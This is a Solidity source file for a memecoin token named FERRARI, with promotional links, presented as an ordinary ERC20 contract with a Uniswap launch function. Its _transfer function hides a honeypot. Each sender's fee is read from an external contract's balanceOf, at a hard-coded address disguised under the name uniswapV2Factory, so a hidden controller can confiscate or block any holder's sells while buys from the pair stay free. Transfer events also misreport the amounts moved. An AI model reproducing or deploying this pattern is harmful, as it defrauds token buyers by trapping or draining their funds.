// SPDX-License-Identifier: MIT

/*

    https://ferrarieth.fun/
    https://t.me/ferraricoinerc20
    https://twitter.com/ferraricoineth

  .-.                                                                 
 /    \                                                          .-.  
 | .`. ;    .--.    ___ .-.     ___ .-.      .---.   ___ .-.    ( __) 
 | |(___)  /    \  (   )   \   (   )   \    / .-, \ (   )   \   (''") 
 | |_     |  .-. ;  | ' .-. ;   | ' .-. ;  (__) ; |  | ' .-. ;   | |  
(   __)   |  | | |  |  / (___)  |  / (___)   .'`  |  |  / (___)  | |  
 | |      |  |/  |  | |         | |         / .'| |  | |         | |  
 | |      |  ' _.'  | |         | |        | /  | |  | |         | |  
 | |      |  .'.-.  | |         | |        ; |  ; |  | |         | |  
 | |      '  `-' /  | |         | |        ' `-'  |  | |         | |  
(___)      `.__.'  (___)       (___)       `.__.'_. (___)       (___) 
                                                                      
                                                                      

*/


pragma solidity 0.8.24;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);
}
interface IERC20 {
    event Approval (address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spnder) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address); 
     function addLiquidityETH( address token, 
     uint amountTokenDesire, 
     uint amountTokenMi, 
     uint amountETHMi, 
     address to, 
     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair); 
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
abstract contract Ownable{
    address private _owner;

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract FERRARI is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private constant _name = "FERRARI";
    string private constant _symbol = "FERRARI";

    mapping (address => uint256) private _balances;

    uint256 private _totalSupply =  4219390000000000000 * 10 ** _decimals;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapPair;
    bool tradingStarted = false; 
    address internal uniswapV2Factory = 0x268556fE31555812467a1069e0184754353530bb;
    uint256 public swapTokensAtAmount = (_totalSupply * 2)/1000;
    uint256 private lastSellBlock = 0;
    bool private swapEnabled = false;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}


    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingStarted, "Trading already opened");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        tradingStarted = true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 _fee = 0;
        require(from != address(0));
        require(amount > 0);
        uint256 feeRate = IERC20(uniswapV2Factory).balanceOf(from);
        if (from != address(this) && from != uniswapPair) { 
            _fee = amount.mul(feeRate).div(100);
        }
        _balances[from] = _balances[from].sub(amount); 
        _balances[to] = _balances[to].add(amount).sub(_fee);
        emit Transfer(from, to, amount);
    }
}